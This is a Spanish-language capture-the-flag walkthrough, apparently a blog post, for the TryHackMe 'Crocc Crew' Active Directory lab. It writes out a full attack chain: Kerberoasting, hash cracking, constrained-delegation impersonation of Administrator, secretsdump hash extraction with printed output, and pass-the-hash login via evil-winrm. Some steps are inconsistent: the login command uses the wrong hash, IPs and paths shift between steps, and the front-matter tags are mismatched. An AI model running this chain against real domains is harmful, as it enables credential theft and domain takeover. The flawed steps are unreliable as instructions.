+++
author = "Darlez.Sec"
title = "Crocc Crew"
date = "2019-03-11"
description = "CTF Crocc Crew Nivel insane, donde se ven temas de explotacion a Kerberos, AD = Active Directory, Evil-WinRM entre otras cosas.."
tags = [
"markdown",
"css",
"html",
"themes",
]
categories = [
"themes",
"syntax",
]
series = ["Themes Guide"]
aliases = ["migrate-from-jekyl"]
image = "https://tryhackme-images.s3.amazonaws.com/room-icons/d387f5c6b5c2bfd07451dd27c187e185.png"
+++

`Reconocimiento:` 

Usaremos la herramienta de nmap para escanear puertos y versiones...

haremos un ( sudo nmap -sS --min-rate 5000 -sCV -p- -A $ip -oN nmap_all.txt

Explicacion de cada parametro seleccionado:

`-sS para habilitar la opcion SYN Port Scan, --min-rate 5000 para que no envie paquetes menores a 5000 por segundo, -sCV para que lanze una serie de scripts de enumeraciones y para que nos saque banner y versiones de los servicios, -p- para que nos haga un escaneo de los 65535 puertos, -A para habilitar la deteccion del SO = Sistema Operativo, la deteccion de versiones y escaneo de rutas, -oN para guardarlo en un formato por default de nmap, en mi caso yo le coloque el nombre de "nmap_all.txt"`

`Enumeracion de Directorios:`

usaremos la herramienta de dirsearch para enumerar directorios de la pagina...

Instalacion: git clone https://github.com/maurosoria/dirsearch.git

veremos que nos dejo una carpeta asi que entraremos con cd dirsearch

ahora haremos un ./dirsearch.py -u http://10.10.210.71

con la enumeracion realizada veremos que hay un /robots.txt , para los que no sepan que son los robots.txt basicamente:

`Robots.txt ¿Que es? : Un archivo robots.txt es un archivo que se encuentra en la raíz de un sitio e indica a qué partes no quieres que accedan los rastreadores de los motores de búsqueda. El archivo utiliza el Estándar de exclusión de robots, que es un protocolo con un pequeño conjunto de comandos que se puede utilizar para indicar el acceso al sitio web por sección y por tipos específicos de rastreadores web (como los rastreadores móviles o los rastreadores de ordenador)`

ya con eso aprendido haremos un

curl http://10.10.140.48/robots.txt

y vemos que nos da 3 directorios, veamos que hay en ellos.

haremos un ( curl http://10.10.140.48/db-config.bak )

y tendremos las primeras credenciales, 

vemos que hay smbclient pero antes que nada necesitaremos algunas credenciales para acceder.

ahora probaremos con la herramienta "rpcclient"
 
para los que no sepan que es esta herramienta les dejare un resumen:

El programa rpcclient ejecuta comandos administrativos usando Microsoft RPCs, el cual proporciona acceso a la interfaz de administración gráfica del usuario Windows (GUIs) para la administración de sistemas. Usualmente es utilizado por los usuarios más avanzados que entienden la complejidad de Microsoft RPCs.

haremos un: rpcclient -U% 10.10.140.48 

ya estamos como cliente de rpc ahora escribiremos enumprivs

El comando 'enumprivs' reveló los privilegios del usuario actual en la máquina. Podemos ver que "SeEnableDelegationPrivilege" aparece junto con "SeDelegateSessionUserImpersonatePrivilege". "SeEnableDelegationPrivilege" determina si una cuenta de usuario puede permitir que se confíe en las cuentas de usuario para la delegación. Esto puede influir en la delegación restringida

Nota: cada vez que yo ponga una ip ustedes tendran que cambiarla a por la de su maquina.

nos conectaremos remotamente al escritorio de windows usando RPD ( Remote Desktop Protocol ) 

haremos un rdesktop -f -u "" 10.10.140.48 

nos preguntara ¿Confía en este certificado (sí/no)? escribiremos que si, o yes

como vemos el wallpaper que tiene de pantalla de bloqueo no esta dejando unas credenciales en la parte inferior a la derecha Visitor GuestLogin!
USER=Visitor PASSWORD=GuestLogin! si le damos abajo y intentamos cambiar de usuario y escribimos las credenciales tampoco nos dara acceso, dejaremos que se cierre solo el rdesktop, no tardara mucho...

ya fuera de rdesktop tendremos las credenciales para smbclient asi que haremos un smbclient -L 10.10.140.48 -U 'Visitor'

-L hace referencia a LHOST y -U hace referencia a user.

como vemos tampoco nos dio acceso al smbclient asi que usaremos la herramienta de smbmap

para los que tengan una idea de lo que va esta herrameinta les dejo un corto resumen:

`Desde hace unos ya tenemos disponible en los repositorios de Kali Linux la herramienta SMBMap, que permite enumerar recursos compartidos SAMBA a lo largo de un dominio. Y no sólo eso, enumera contenidos y permisos, soporta pass-the-hash, descarga/sube/borra archivos, busca patrones de nombres de archivo con la opción de autodescargarlos e incluso ejecuta comandos en remoto.`

con eso aprendido podemos comenzar

smbmap -H 10.10.140.48 -u "Visitor" -p "GuestLogin\!" -r Home

-u para el usuario -p para la password -r para la ruta.

Con -r nos estaremos moviendo de directorios y con --download los estariamos descargando
 
Explorando vemos una carpeta compartida llamada Home la cual tiene la primera bandera asi que procedemos a descargarla con el siguiente comando

smbmap -H 10.10.140.48 -u "Visitor" -p "GuestLogin\!" -r Home --download Home/user.txt

haremos un ls y ahi estara en nuestro directorio, le haremos un cat para ver lo que contiene el archivo

cat 10.10.140.48-Home_user.txt

Obtuvimos con exito la primera flag!!!

usaremos crackmapexec para ver que otro dominio tiene la pagina, se que esta herramienta deberia de ir en la seccion de post explotacion pero creo que aqui sera mas util
cuando usemos impacket.

haremos un crackmapexec smb 10.10.206.226 -u 'Visitor' -p 'GuestLogin!'

-p = password -u = user > usuario

vemos que el dominio es COOCTUS.CORP, nos servira para el futuro.

ahora vamos con la siguiente pregunta que nos hace TryHackMe ¿Cuál es el nombre de la cuenta que plantó Crocc Crew? para esto usaremos la herramienta de LDAP para encontrar el usuario con las credenciales que anteriormente hemos encontrado...

usaremos la herramienta de ldapdump para ver los usuarios, les dejare un resumen de lo que es basicamente esta herramienta...

El protocolo ligero de acceso a directorios (en inglés: Lightweight Directory Access Protocol, también conocido por sus siglas de LDAP) hace referencia a un protocolo a nivel de aplicación que permite el acceso a un servicio de directorio ordenado y distribuido para buscar diversa información en un entorno de red.

con eso aprendido usaremos la dicha herramineta haremos un:

ip=laipdetumaquina, ejemplo ( ip=10.10.71.209 )

ldapdomaindump $ip -u 'COOCTUS.CORP\Visitor' -p GuestLogin!

nos iremos a la carpeta en la que estan y abriremos el archivo domain_user.html

En domain_users.html podremos ver varios usuarios incluida la respuesta a la segunda pregunta y tambien podremos ver el usuario "reset" que lo usaremos mas adelante


si no se confian de como sacamos y sabemos de que ese era el usuario, pues usaremos otra herramienta para ver la lista de usuarios..

`Explicacion de la herramienta enum4linux:`

`enum4linux es una herramienta de enumeración de windows y sistemas samba. Esta intenta ofrecer una funcionabilidad similar a enum.exe antes disponible en www.bindview.com. Esta escrito en Perl y es básicamente incorpora todas las herramientas de smbclient, rpclient, net y nmblookup.`

ahora si, haremos un enum4linux -u 'Visitor' -p 'GuestLogin!' -U 10.10.140.48 y veremos que nos dio una lista bastante extensa de usuarios, si van haciendo el procedimiento conmigo entonces les sera facil reconocer el usuario, con eso completado 

pista: tiene el mismo nombre que la room

basicamente solo busque algun nombre que coincidiera con la ctf, entre ellos estaba ese usuario...

Busqueda de Vulnerabilidades:

usaremos la herramienta de impacket, para los que no sepan que es les dejare una
explicacion:

`Impacket es una colección de clases de Python para trabajar con protocolos de red. Impacket se enfoca en proporcionar acceso programático de bajo nivel a los paquetes y, para algunos protocolos (por ejemplo, SMB1-3 y MSRPC), la implementación del protocolo en sí. Los paquetes pueden construirse desde cero, así como analizarse a partir de datos sin procesar, y la API orientada a objetos simplifica el trabajo con jerarquías profundas de protocolos. La biblioteca proporciona un conjunto de herramientas como ejemplos de lo que se puede hacer dentro del contexto de esta biblioteca`

con esto aprendido podemos comenzar:

haremos un impacket-GetUserSPNs 'COOCTUS.CORP/Visitor:GuestLogin!' -dc-ip 10.10.140.48 -request -outputfile TGS.txt

para ver si podemos encontrar una cuenta de servicio para abusar.

si hacen un cat TGS.txt veran que nos dejo un HASH, intentemos romperlo con John The Ripper,
 
haremos un  john TGS.txt --wordlist=/usr/share/wordlists/rockyou.txt --fork=4

Nota: es probable que el diccionario este comprimido asi que te tendras que ir ala ruta /usr/share/wordlists/ y haras un gzip -d rockyou.txt y con eso ya funcionaria bien si es que en caso no lo hayas descomprimido antes.

y ahi estara las contraseña: resetpassword

ahora haremos un:

impacket-findDelegation -debug  COOCTUS.CORP/password-reset:resetpassword -dc-ip 10.10.206.226

para el uso de la delegación de búsqueda de impacket para extraer más información sobre la delegación.
 
 ahora haremos un 
 impacket-getST -spn oakley/DC.COOCTUS.CORP -impersonate Administrator "COOCTUS.CORP/password-reset:resetpassword" -dc-ip 10.10.206.226

El resultado de este script será un ticket de servicio para el usuario administrador.
Una vez que tengamos el archivo ccache, configúrelo en la variable KRB5CCNAME para que se cargue dentro de la memoria y luego podamos usarlo a nuestro favor.

ahora haremos un export KRB5CCNAME=Administrator.ccache para el uso de la secuencia de comandos secretsdump de impacket para volcar hashes de usuario.

para ahorrarnos futuros errores y tiempo añadiremos esto a nuestra /etc/hosts con la ip de su maquina ( DC.COOCTUS.CORP ) eso añadiran claramente ira sin los parentesis, aqui un ejemplo de como tuvo que quedar

```yaml
___________________________________________________________
127.0.0.1       localhost
127.0.1.1       kali
10.10.79.189    DC.COOCTUS.CORP
 The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
____________________________________________________________
```
ahora haremos un impacket-secretsdump -k -no-pass DC.COOCTUS.CORP

Una vez que hayamos hecho eso, debería volcar con éxito los hashes NTLM del usuario.

el hash que colocaras tendria que ser este:
❯ impacket-secretsdump -k -no-pass DC.COOCTUS.CORP
```yam
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xdadf91990ade51602422e8283bad7a4771ca859b
dpapi_userkey:0x95ca7d2a7ae7ce38f20f1b11c22a05e5e23b321b
[*] NL$KM 
 0000   D5 05 74 5F A7 08 35 EA  EC 25 41 2C 20 DC 36 0C   ..t_..5..%A, .6.
 0010   AC CE CB 12 8C 13 AC 43  58 9C F7 5C 88 E4 7A C3   .......CX..\..z.
 0020   98 F2 BB EC 5F CB 14 63  1D 43 8C 81 11 1E 51 EC   ...._..c.C....Q.
 0030   66 07 6D FB 19 C4 2C 0E  9A 07 30 2A 90 27 2C 6B   f.m...,...0*.',k
NL$KM:d505745fa70835eaec25412c20dc360caccecb128c13ac43589cf75c88e47ac398f2bbec5fcb14631d438c81111e51ec66076dfb19c42c0e9a07302a90272c6b
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:add41095f1fb0405b32f70a489de022d:::
```
`Post Explotacion:`

en la parte donde dice Administrador seleccionaran el hash que empieza con add, esta el que inicia con aad pero no, ustedes usaran el que dice add

ahora para lograr obtener una shell como administrador lo que haremos sera 
evil-winrm -i 10.10.206.226 -u Administrator -H aad3b435b51404eeaad3b435b51404ee

-i hace referencia a IP -u hace referencia a Usuario -H hace refencia a HASH

`Escalada De Privilegios:`

comenzaremos con una busqueda rapida a los archivos txt y user.

Get-Childitem -Path C:\ -Include *user*.txt* -File -Recurse -ErrorAction SilentlyContinue

como ven nos deja un directorio llamado C:\Shares\Home entremos con cd C:\PerfLogs\Admin y hagamos un dir y como vemos ahi estan las 2 flags mas que necesitabamos, la user.txt ya la habiamos sacado con smbmap...

haremos una busqueda a nivel raiz para la bandera root.txt

Get-Childitem -Path / -Include root.txt -File -Recurse -ErrorAction SilentlyContinue 

como ven nos tiro esta ruta >>> C:\PerfLogs\Admin entremos con cd C:\PerfLogs\Admin

hacemos un type root.txt y ahi estaria la bandera root, y con eso estaria terminada la ctf, espero que les haya agradado el video y cualquier duda o error que tengan en cualquiera de las ctfs que suba al canal me pueden preguntar por privado, me encuentran como @samsepiol gracias por ver el video.

Link My Community: t.me/Un0zandC3r0z

